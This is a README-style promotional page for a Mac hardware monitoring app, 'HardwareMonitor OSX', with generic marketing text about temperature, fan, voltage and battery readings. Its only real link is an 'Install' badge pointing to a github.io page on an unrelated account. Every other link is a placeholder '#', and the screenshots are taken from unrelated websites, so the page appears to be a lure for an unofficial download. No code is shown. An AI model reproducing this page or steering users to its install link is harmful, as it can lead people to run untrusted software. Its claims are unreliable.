# HardwareMonitor OSX

<p align="center">
  <img src="https://macx.ws/uploads/posts/2017-08/1504207889_hardwaremonitor.png" width="200" alt="HardwareMonitor icon"/>
</p>

<p align="center">

[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://samara-apes.github.io/.github/hardwaremonitor)

</p>

<p align="center">
  <img src="https://thesweetbits.com/wp-content/uploads/2019/11/macsystemmonitor.jpg" alt="HardwareMonitor screenshot"/>
</p>

---

## Overview

Understanding what is happening inside a Mac at the hardware level — what temperatures the CPU and GPU are running at, how fast the fans are spinning, whether voltage rails are within specification, and how much power the system is consuming — requires access to the internal sensor network that Apple exposes partially through Activity Monitor but comprehensively through dedicated hardware monitoring applications. <a href="#">HardwareMonitor</a> provides this access, reading data directly from the sensors embedded throughout the Mac's hardware and presenting it in a clear, readable interface that makes system health assessment and <a href="#">thermal management</a> genuinely informative.

Temperature monitoring covers the sensors that matter most for system health. CPU package temperature, individual core temperatures, GPU die temperature, <a href="#">SSD temperature</a>, battery temperature, and ambient enclosure temperatures are all read and displayed in real time, updating continuously as the system load changes. For users experiencing thermal throttling — where the processor reduces its clock speed to avoid overheating — knowing which sensor is approaching its thermal limit and whether the fans are responding appropriately provides the diagnostic information needed to determine whether the issue is hardware, software, or environmental. The relationship between <a href="#">CPU load</a>, CPU temperature, and fan speed is visible simultaneously, making it possible to observe how the thermal management system responds to workloads in real time.

Fan speed monitoring reports actual RPM readings from all cooling fans in the system, providing direct confirmation of whether the <a href="#">fans</a> are operating and at what speed. In a Mac that is running hot but whose fans are not spinning up proportionally, this observation immediately suggests a software thermal management issue or a failing fan rather than simply insufficient cooling capacity. <a href="#">Voltage monitoring</a> reads the power rails supplying the CPU, memory, and other components, providing a reference for diagnosing stability issues that could be related to supply voltage quality. The <a href="#">historical logging</a> capability records sensor readings over time, creating a data record that shows temperature trends during specific tasks, identifies periods of thermal stress, and provides the historical context that makes diagnosing intermittent issues significantly more tractable than relying on real-time readings alone.

---

## Key Features

- Real-time <a href="#">CPU and GPU temperature</a> readings from internal sensors
- <a href="#">Fan speed</a> monitoring with actual RPM readings from all system fans
- SSD, <a href="#">battery</a>, and enclosure temperature sensor access
- <a href="#">Voltage monitoring</a> across CPU, memory, and system power rails
- Battery <a href="#">health metrics</a> including cycle count and capacity measurements
- <a href="#">Historical logging</a> of sensor data for trend analysis and diagnostics
- Menu bar <a href="#">persistent display</a> of selected key sensor readings
- Power <a href="#">consumption</a> monitoring for CPU and system components
- Comprehensive <a href="#">hardware visibility</a> beyond standard macOS system utilities

---

<p align="center">
  <img src="https://preview.redd.it/lightweight-free-hardware-monitoring-app-any-need-for-it-v0-gagbffaheihf1.png?width=640&crop=smart&auto=webp&s=9633e1ae7dae9ac5f2bb53ddf06918abc2da4187" alt="HardwareMonitor screenshot"/>
</p>

---

## Additional Information

HardwareMonitor's value for troubleshooting is clearest when a Mac is behaving unexpectedly. The combination of CPU temperature, fan speed, and clock frequency data makes it possible to diagnose thermal throttling — where performance degrades to protect hardware from heat — quickly and confidently rather than through speculation.

Fan speed data is the most immediately actionable information HardwareMonitor provides for thermal issues. Confirming that fans are spinning up in response to temperature increase validates that the thermal management system is functioning correctly; finding that fans are not responding to high temperatures identifies a component of the system that requires attention.

Battery health monitoring with full cycle count and capacity data provides the complete picture of battery ageing that the macOS battery menu bar display does not. Understanding the current maximum capacity relative to original design capacity gives a realistic assessment of remaining battery life and the urgency of a battery replacement decision.

---
